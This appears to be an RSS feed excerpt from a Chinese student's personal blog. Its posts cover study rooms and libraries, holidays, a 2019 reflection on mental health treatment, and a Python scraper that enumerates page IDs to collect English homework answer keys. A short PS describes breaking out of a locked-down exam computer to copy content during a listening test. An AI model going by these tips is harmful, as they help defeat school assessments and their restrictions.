&lt;p&gt;自习室有单独的包间，价格 40 元每小时，然而因为使用的人太少了，租用时间长后就会有巨大优惠。在普通的位置上，有隔着隔板面对面的位置。他对面的人是有些 abnormal，没有按规矩每天离开时把自己的物品拿走，总是穿着人大附中的校服，在桌上贴了个写着「700」（注：指高考分数）的纸张，并且读《红楼梦》。&lt;/p&gt;
&lt;p&gt;这才想起コロナ涌现伊始的那段时间，扬州市图书馆关门大吉。之后的几月是限流，每日数百人，最多同时进入若干人。因为很早就取消了借书不还的期限，所以还书并不是一件需要着急的事，更何况二层图书馆门外还有自动还书机，限流似乎是合情合理的事。于是图书馆学习无望。即使到了北京来，大部分图书馆还是要预约。コロナ！！把多少人的生活！！！都毁了！？！？！？我不得而知。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;在自习室学习有效吗？&lt;/strong&gt;&lt;a href=&quot;https://telegra.ph/%E8%80%83%E7%A0%94%E4%B8%AD%E5%B9%B4%E4%BA%BA%E8%B5%B0%E8%BF%9B%E4%BB%98%E8%B4%B9%E8%87%AA%E4%B9%A0%E5%AE%A4-01-09&quot;&gt;《考研中年人，走进付费自习室》&lt;/a&gt;中提及的理由是家里太吵不适合学习之类的。换个环境的确有用，但是一切都是稍近益狎，久了注意力依然会减弱。不过花钱应该会效率很高；可是我看了看支付宝口碑上的价格，除了一开始的几个小时 1 元优惠，即便是包日也是很贵的，纵然值得，想必破费的感觉也不好受。&lt;/p&gt;
&lt;p&gt;文章里面还有提到有特色的暗室自习室：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://legra.ph/file/d632a46875e58fa1c3361.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我搜了搜，大概长这样？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这家自习室主打暗室自习，突出一个「暗」字。一推开门，就跟钻进黑暗隧道差不多。只在有人学习的地方会亮起一盏黄色的灯，像是隧道尽头的亮光。 这一点亮光隐喻着「希望」。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;虽然听起来奇出怪样，但是作为 ADHD，确实常有在夜已央时在暗淡的黄色护眼灯光下体会到 &lt;a href=&quot;https://www.reddit.com/r/ADHD/comments/c4gytt/adhd_at_night_random_bursts_of_energy_or_focus/?utm_source=amp&amp;amp;utm_medium=&amp;amp;utm_content=post_title&amp;amp;ampcid=1*1jn0zn6*cid*YW1wLWhac251bldPMlpVc19VNUl5djJEMFE.&quot;&gt;random bursts of energy or focus for no reason（r/ADHD）&lt;/a&gt; 而一门心思做题上瘾的时候。&lt;/p&gt;
&lt;p&gt;于是更加怀念且贪恋起扬州的好。偌大的图书馆高峰时也不会坐得特别满；二十几个城市书房遍布于风景优美的人口众多处。&lt;a href=&quot;https://zh.m.wikipedia.org/zh-hans/%E6%98%8E%E6%9C%88%E6%B9%96&quot;&gt;明月湖（维基百科）&lt;/a&gt;畔便有两个，一个是商城附近，人较多；另一个紧邻图书馆，以俟闭馆后的读者。常常周末在那里写作业，即使周末时间紧迫也会赶过去。学校旁边是风景区，那边的城市书房在二楼（？），房间挺高，装饰也好看，只是不愿见到我们学校的学生和无所事事的家长。📝&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2021 年 3 月 13 日晚于 Notion，页面标题是「自习室」。&lt;/p&gt;
</content:encoded></item><item><title>洋节</title><link>https://blog.xinshijiededa.men/christmas/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/christmas/</guid><description>应该是自从那年，能在公共场合看到圣诞树已是一件十分稀有的事情。</description><pubDate>Fri, 25 Dec 2020 22:39:48 GMT</pubDate><content:encoded>&lt;p&gt;今天是圣诞节。学校门口在一周前就摆了个圣诞树🎄。每层内还另有一棵，挂着所有人写的「新年愿望」。&lt;/p&gt;
&lt;p&gt;还记得 17 年的那场大雪，盆景园、护城河畔，静谧的雪里心情虽不舒畅，但却也能有暂时的慰藉。当时的焦虑大部分现在已经随风而逝，但谁又能想到今天的境遇呢？&lt;/p&gt;
&lt;p&gt;18 年的圣诞好像在听&lt;a href=&quot;https://music.163.com/#/song?id=40249016&quot;&gt;「Christmas」（网易云音乐）&lt;/a&gt;。应该是自从那年，能在公共场合看到圣诞树已是一件十分稀有的事情。我在这意外的拥抱中，也懒散而且舒适，从白天以至初夜的焦虑，全给这圣诞节的空气一扫而空了，只觉得天龙人们歆享了牲醴和香烟，都醉醺醺的在空中蹒跚，预备给（如今再也不是）小镇的做题家们以无限的幸福。📝&lt;/p&gt;
</content:encoded></item><item><title>熟词生义</title><link>https://blog.xinshijiededa.men/garage/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/garage/</guid><pubDate>Fri, 23 Oct 2020 00:02:59 GMT</pubDate><content:encoded>&lt;p&gt;今天做听力的时候，有第四道题的对话是一个人在广告上看到了修车的广告，到这里来修车。选项问这是什么地方：&amp;lt;span lang=&amp;quot;en&amp;quot;&amp;gt;a parking lot, a factory or a &amp;lt;em&amp;gt;garage&amp;lt;/em&amp;gt;&amp;lt;/span&amp;gt;。正确答案是 garage，因为有一项意思是汽车修理间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://telegra.ph/file/57851e6d307334d61c712.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;🔑 [countable] a place where vehicles are repaired and where you can buy a car or buy petrol/gas and oil （兼营汽车销售、修理及加油的）汽车修理厂&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;考熟词生义总比奇怪题目不知所云要好。&lt;/p&gt;
&lt;p&gt;PS: 今天再去机房考试，学校已经 ban 了网络连接。发现进入考试后可以通过极域电子教室的浮动面板调出资源管理器，然后新建 .&lt;strong&gt;rtf&lt;/strong&gt; 文件，用写字板打开，按 PrtScr 截图后粘贴用来应付听后转述。📝&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;写于 Telegraph，2020 年 10 月 23 日。如果你看不到图片，说明你无法访问 &lt;a href=&quot;https://telegra.ph&quot;&gt;telegra.ph&lt;/a&gt;。&lt;/p&gt;
</content:encoded></item><item><title>2019 | 写在年关岁末</title><link>https://blog.xinshijiededa.men/2019/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/2019/</guid><pubDate>Fri, 24 Jan 2020 23:44:56 GMT</pubDate><content:encoded>&lt;p&gt;第一次写这种文章。在除夕发布，并不是因为一时兴起，也非构思很久，只是学业繁忙，只有在假期中间，才有心情和时间将一年来的思绪付诸文字。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这才知道我的全部努力
不过完成了普通的生活。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;——穆旦&lt;a href=&quot;https://bedtimepoem.com/?p=7221&quot;&gt;《冥想》&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;即将过去的一年，大概可以说是一生中改变最大的一年。&lt;/p&gt;
&lt;h2&gt;学业&lt;/h2&gt;
&lt;h3&gt;山重水复&lt;/h3&gt;
&lt;p&gt;高二的下半学期紧张地开始。三月份中有江苏省最后一届「小高考」。虽然政策有所变化，但为了防止学测成绩被高校用作录取的依据，复习的要求还是十分紧的。那几个星期，早读常常用来死磕化学式，体育课会拿着地理政治的讲义独自站在校园无人的一隅。但这些尝试最后似乎都徒劳无功，到了考试的时候化学的大题目一如既往地看不懂，政治明知要求背诵的句子依旧只能记得几句。只好带着疑惑、不解和糟糕的心情，进入了接下来的生活。&lt;/p&gt;
&lt;h3&gt;新的转机&lt;/h3&gt;
&lt;p&gt;在友人的建议下，去了市里的医院。先是一所综合性的，但最后也只是「心理咨询」；随后到精神专科医院，开了SSRIs。刚开始服用的时候副作用很大，但效果也很显著。呼吸到多年以来不曾有过的新鲜平和的空气，生活还是有很大改善的。但是，随着药效的减弱，渐渐觉得还应该有 &lt;em&gt;其他的因素&lt;/em&gt;：ADD。&lt;/p&gt;
&lt;h3&gt;柳暗花明&lt;/h3&gt;
&lt;p&gt;之后就到了北京的安定医院。本以为确诊无望，但跟医生说了「分心」的情况，做了量表，最后大概是如愿以偿地拿到了治疗多动症的药物。因为是精神类药物，还得按月去拿，最后只得在京东上购买替代品。
分班考试靠着一学年的稳定的分数进入了同学科中最好的一个班。
鼓起勇气报名参加了运动会，长跑之后瘫在草坪上，有一种前所未有的喜悦。然后只记得同学把我搀扶回去时的温暖。
虽然能够减轻一时的杂念，药物的副作用还是很大的。并不是说身体上的那种疼痛，而是精神上一定的依赖性，还有恶心的感觉，即使心里深知今后不可能一辈子都依赖在这些东西上。
但是长久以来一直困扰我的疑惑终于能解决，明白了自身的长处（？）和短处后，能够直面恐惧的根源，这样的变化还是很不错的。就像知乎上一位答主所说的吧：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;接受不好的可能性和残酷的现实，明白很多梦想都会落空，很多奋斗注定白费，很多努力永远没有结果，很多能力你没有就是没有。
但还是把能做的都做了吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;生活&lt;/h2&gt;
&lt;p&gt;背了点日语。可惜散步的时候听力是懵的，最后果然因为听力没有过。
没写什么有技术含量的代码。只是做了几个无聊的 Telegram 机器人，还有自用的小工具。
也没读几本书，不过电影、剧貌似看了不少。大部分时间还是耗费在了网上。
暑假在华北玩了一圈。&lt;/p&gt;
&lt;p&gt;啊啊，最重要的是养了一只猫。当初在各种昵称中拿捏不定，最后还是让 ta 像《我是猫》中的那只猫一样，「名前はまだ無い」。猫最近喜欢和我安静地呆在空调房中。不由得想起买回来只有两个月大的时候的纯真的眼神。如今已经长长、长胖了许多。
今年听的最多的歌是《春愁》、改编的&lt;a href=&quot;http://music.163.com/song/432430716/&quot;&gt;《巴赫平均律》&lt;/a&gt;。&lt;/p&gt;
&lt;h2&gt;成长&lt;/h2&gt;
&lt;p&gt;虽然说是变化最大的一年，但是这些变化很难说是我自己通过努力促成的。&lt;/p&gt;
&lt;p&gt;与 2018 时相比，大概最为不同的是价值观的改变。与那时盲目羡慕别人的生活相比，能够清晰地辨明那其实并不是我真正想要的，会在看到别人与我的不同之处后一笑置之。虽然说人各有志，但是也难免不将别人的美好生活内化为自己的追求，只是在更加了解自己后，会更加坚定地朝着既定的目标努力。&lt;/p&gt;
&lt;h2&gt;未完待续&lt;/h2&gt;
&lt;p&gt;上次春节的时候，在江边的渡口和家人游玩，期间和🌸聊着天。流感的奇怪氛围中，今年心情一样复杂不同于往年。不知道一年后走过的自己，借用黑塞的话说——&lt;/p&gt;
&lt;p&gt;将会以怎样惊异的目光回顾 ta 走过的曲折复杂、摇摆不定的生活途径，会如何对此事的自己投以鼓励的、责备的、同情的、快乐的微笑！&lt;/p&gt;
</content:encoded></item><item><title>用 Python 爬取作业答案</title><link>https://blog.xinshijiededa.men/crawl-homework-answers-with-python/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/crawl-homework-answers-with-python/</guid><pubDate>Sun, 05 Jan 2020 22:58:27 GMT</pubDate><content:encoded>&lt;p&gt;上高中以来，学校一直订了一份「报纸」当作业用，叫《学英语》。最近做题时发现报纸与时俱进，多了几个二维码，分别是微信公众号还有「&lt;strong&gt;扫一扫　查答案&lt;/strong&gt;」。&lt;/p&gt;
&lt;h2&gt;目标网站&lt;/h2&gt;
&lt;p&gt;通过二维码扫描出来的结果是上一期的答案。网页的地址长这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./_url.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;简直不要太直白。&lt;/p&gt;
&lt;p&gt;首先在网站逛了一圈，PC 版风格看起来仍然是很老旧的那种；网站首页是有专门的答案分区，但是点进来的答案很少。显然，我所需要的答案没有文章列表，必须要经过扫描二维码拿到。&lt;/p&gt;
&lt;p&gt;然后便是尝试改地址：稍稍增减 id 参数，可以看到最近发的文章：&lt;img src=&quot;https://i.loli.net/2019/12/31/B5dGa6IQcK2AqSP.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;发现只有几期的答案是连在一起的，其余的有很多这家报社的其他产品的内容。这些答案的排布也并不是那么有规律，比如下一个 id 的是上上期的答案。那么，只需要爬取附近的每个页面，然后把符合要求的找出来就行了。&lt;/p&gt;
&lt;h2&gt;开发环境&lt;/h2&gt;
&lt;p&gt;Google 提供了免费的 &lt;a href=&quot;https://jupyter.org/&quot;&gt;Jupyter Notebook&lt;/a&gt; 环境—— Colab，无需配置，开箱即用。&lt;a href=&quot;https://colab.research.google.com/notebook#create=true&amp;amp;language=python3&quot;&gt;进入&lt;/a&gt; 后创建一个新的 PYTHON3 笔记本。&lt;/p&gt;
&lt;p&gt;或者，你也可以下载 &lt;a href=&quot;https://www.anaconda.com/download/&quot;&gt;ANACONDA&lt;/a&gt; 并安装。接着执行命令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;$ pip install pipenv
$ pipenv shell
$ jupyter notebook
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这之后默认浏览器会打开本地的 Jupyter Notebook。&lt;/p&gt;
&lt;p&gt;我们需要安装  requests_html 做爬虫。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;requests-html 是基于现有的框架 PyQuery、Requests、lxml、beautifulsoup4 等库进行了二次封装，作者将 Requests 设计的简单强大的优点带到了该项目中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;!pip install requests_html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Jupyter Notebook 中，以 &lt;code&gt;!&lt;/code&gt; 开头的行会被解释成命令。&lt;/p&gt;
&lt;h2&gt;爬取和解析&lt;/h2&gt;
&lt;p&gt;这种 CMS 一般都没什么反爬措施，连 X5 浏览器 UA 都不需要伪造。所有网页的标题都是相同的，所以爬取每个页面内的标题就好。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/12/31/qGlMH5vSUkXWRsm.png&quot; alt=&quot;image.png&quot;&gt;
Chrome 内右键目标元素，点「检查」，右键 Elements 中高亮的颜色，复制选择器。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-css&quot;&gt;#dummybodyid &amp;gt; div.contentbox &amp;gt; h3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对下面的答案图片如法炮制，它们的选择器分别是：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-css&quot;&gt;#dummybodyid &amp;gt; div.contentbox &amp;gt; div &amp;gt; p:nth-child(1) &amp;gt; img
#dummybodyid &amp;gt; div.contentbox &amp;gt; div &amp;gt; p:nth-child(2) &amp;gt; img
#dummybodyid &amp;gt; div.contentbox &amp;gt; div &amp;gt; p:nth-child(3) &amp;gt; img
#dummybodyid &amp;gt; div.contentbox &amp;gt; div &amp;gt; p:nth-child(4) &amp;gt; img
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;页面最后一般会有 doc 文档可以下载，但是最近没有了。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;然后便是遍历每个页面了。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{&apos;34210&apos;: &apos;19-20上高三江苏第9期A版参考答案&apos;, &apos;34211&apos;: &apos;19-20上高三江苏第8期A版参考答案&apos;, &apos;34212&apos;: &apos;19-20上八年级★云南第10期听力录音&apos;, &apos;34213&apos;: &apos;19-20上八年级邵阳第10期听力录音&apos;, &apos;34214&apos;: &amp;quot;悦听悦读 The world&apos;s first artificial moon&amp;quot;, &apos;34215&apos;: &apos;悦听悦读Superheroes from Asia&apos;, &apos;34216&apos;: &apos;19-20上八年级广东第10期听力录音&apos;, &apos;34217&apos;: &apos;19-20上外研八年级嘉兴第9期听力录音&apos;, &apos;34218&apos;: &apos;19-20上外研八年级嘉兴第10期听力录音&apos;, &apos;34219&apos;: &apos;19-20上外研八年级嘉兴第11期听力录音&apos;, &apos;34220&apos;: &apos;19-20上外研八年级嘉兴第12期听力录音&apos;, &apos;34221&apos;: &apos;19-20上八年级★赤峰第1期听力录音&apos;,
…,（省略一部分）
&apos;34966&apos;: &apos;19-20上九年级宁波期末检测一本通综合测评（五）听力录音&apos;, &apos;34967&apos;: &apos;悦听悦读Real-life Dora&apos;, &apos;34968&apos;: &apos;19-20上高三江苏第14期A版参考答案&apos;, &apos;34969&apos;: &apos;19-20上高三江苏（N）第15期听力录音&apos;, &apos;34970&apos;: &apos;19-20上高三江苏（N）第14期B1-B4版参考答案&apos;, &apos;34971&apos;: &apos;19-20上高一第24期A4版听力练习录音&apos;, &apos;34972&apos;: &apos;19-20上高三江苏第15期A版参考答案&apos;, &apos;34973&apos;: &apos;19-20上高三江苏（N）第16期听力录音&apos;, &apos;34974&apos;: &apos;19-20上高三江苏（N）第15期B1-B4版参考答案&apos;, &apos;34975&apos;: &apos;Jane and Sara want to go skating（I）&apos;, &apos;34976&apos;: &apos;Jane and Sara want to go skating（II）&apos;, &apos;34977&apos;: &apos;19-20上八年级（J）第17期听力录音&apos;, &apos;34978&apos;: &apos;19-20上八年级（J）第18期听力录音&apos;, &apos;34979&apos;: &apos;19-20上八年级（J）第19期听力录音&apos;, &apos;34980&apos;: &apos;19-20上八年级（J）第20期听力录音&apos;, &apos;34981&apos;: &apos;悦听悦读 An ancient Chinese story&apos;, &apos;34982&apos;: &apos;悦听悦读 Empty-City Strategy&apos;, &apos;34983&apos;: &apos;悦听悦读Hearing loss, a major problem for teenagers&apos;, &apos;34984&apos;: &apos;悦听悦读FOLLOW ME: Hearing loss, a major problem for teenagers&apos;, &apos;34985&apos;: &apos;故事乐园 The ice cream&apos;, &apos;34986&apos;: &amp;quot;故事乐园 It&apos;s Mr Green&amp;quot;, &apos;34987&apos;: &apos;悦听悦读A special fashion show&apos;, &apos;34988&apos;: &apos;悦听悦读Two cute girls&apos;, &apos;34989&apos;: &apos;19-20上八年级曲靖第15期听力录音&apos;, &apos;34990&apos;: &apos;19-20上七年级★福建第15期听力录音&apos;, &apos;34991&apos;: &apos;悦听悦读 Max Einstein: The Genius Experiment&apos;, &apos;34992&apos;: &apos;19-20上九年级（XJ）第9期听力录音&apos;, &apos;34993&apos;: &apos;19-20上九年级（XJ）第10期听力录音&apos;, &apos;34994&apos;: &apos;19-20上九年级（XJ）第11期听力录音&apos;, &apos;34995&apos;: &apos;19-20上九年级（XJ）第12期听力录音&apos;, &apos;34996&apos;: &apos;19-20上七年级★福建第16期听力录音&apos;, &apos;34997&apos;: &apos;Bill and Kitty&apos;, &apos;34998&apos;: &apos;19-20上八年级曲靖第16期听力录音&apos;, &apos;34999&apos;: &apos;悦听悦读Flying car&apos;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Demo&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/OverflowCat/LearningEnglish/&quot;&gt;learningEnglishFetch.py&lt;/a&gt;&lt;/p&gt;
</content:encoded></item><item><title>Re: 从零开始的部落格生活</title><link>https://blog.xinshijiededa.men/hello-world/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/hello-world/</guid><description>你好，世界！</description><pubDate>Wed, 31 Jul 2019 17:15:30 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;你好，世界！&lt;/h2&gt;
&lt;p&gt;两年前的时候用 Wordpress 陆续搭过几个博客，然而却并没有写多少文章；随后 VPS 到期，这事也就不了了之。现在在这里暂且再搭一个，也不想去瞎折腾了。&lt;/p&gt;
</content:encoded></item></channel></rss>